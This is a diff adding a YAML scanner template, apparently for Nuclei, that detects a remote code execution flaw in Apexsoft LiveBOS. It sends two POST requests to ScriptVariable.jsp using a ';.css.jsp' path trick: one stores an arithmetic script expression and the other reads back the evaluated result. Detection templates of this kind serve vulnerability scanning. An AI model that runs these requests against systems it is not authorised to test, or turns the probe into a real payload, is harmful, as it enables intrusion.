@@ -1,0 +1,42 @@
+id: livebos-scriptvariable-rce
+info:
+  name: 顶点 LiveBOS - 远程代码执行漏洞
+  author: socat
+  severity: critical
+  reference:
+    - https://stack.chaitin.com/vuldb/index
+  metadata:
+    verified: true
+    max-request: 2
+    vuln-id: CT-845296
+    vendor: apexsoft
+    product: livebos
+  tags: rce,vuln,livebos
+variables:
+  s1: '{{rand_int(2000, 2100)}}'
+  s2: '{{rand_int(100, 910)}}'
+  payload: '{{url_encode("a=" + to_string(s1) + "*" + to_string(s2) + ";")}}'
+flow: http(1) && http(2)
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/plug-in/common/ScriptVariable.jsp;.css.jsp'
+    redirects: false
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: act=put&scope=0&name=gName13&value={{payload}}
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, "<result>true</result>")'
+  - method: POST
+    path:
+      - '{{BaseURL}}/plug-in/common/ScriptVariable.jsp;.css.jsp'
+    redirects: false
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: act=get&scope=0&name=gName13
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, to_string(to_string(s1 * s2)))'
